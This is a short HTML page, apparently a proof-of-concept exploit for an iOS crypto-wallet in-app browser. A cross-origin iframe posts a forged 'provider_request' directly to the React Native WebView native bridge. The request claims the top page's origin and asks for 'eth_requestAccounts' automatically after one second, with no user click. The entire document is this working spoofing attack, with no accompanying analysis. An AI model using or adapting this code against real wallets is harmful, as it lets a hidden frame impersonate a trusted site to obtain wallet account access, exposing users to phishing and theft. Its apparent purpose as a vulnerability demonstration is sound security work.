<!doctype html>
<meta charset="utf-8">

Cross-origin Origin B iframe.

<script>
const topOrigin =
  new URLSearchParams(location.search)
    .get('topOrigin');


if (
  !topOrigin ||
  new URL(topOrigin).origin !== topOrigin
) {
  throw new Error('Invalid topOrigin');
}


function sendRequest() {

  /*
   * Actual sender:
   *   Origin B / github.io
   *
   * Claimed sender:
   *   Origin A / ngrok
   */

  const message =
    JSON.stringify({

      method:
        'provider_request',

      payload:
        JSON.stringify({

          id: 424242,

          origin:
            topOrigin,

          request: {

            method:
              'eth_requestAccounts',

            params: []
          }

        })

    });


  const bridge =
    window.webkit?.messageHandlers
      ?.ReactNativeWebView;


  if (!bridge?.postMessage) {
    throw new Error(
      'Core iOS native bridge unavailable'
    );
  }


  bridge.postMessage(
    message
  );


  parent.postMessage(
    'REQUEST_SENT',
    topOrigin
  );
}


parent.postMessage(
  'READY',
  topOrigin
);


/*
 * No click inside Origin A.
 *
 * Cross-origin B automatically originates
 * the wallet request.
 */
setTimeout(
  sendRequest,
  1000
);
</script>
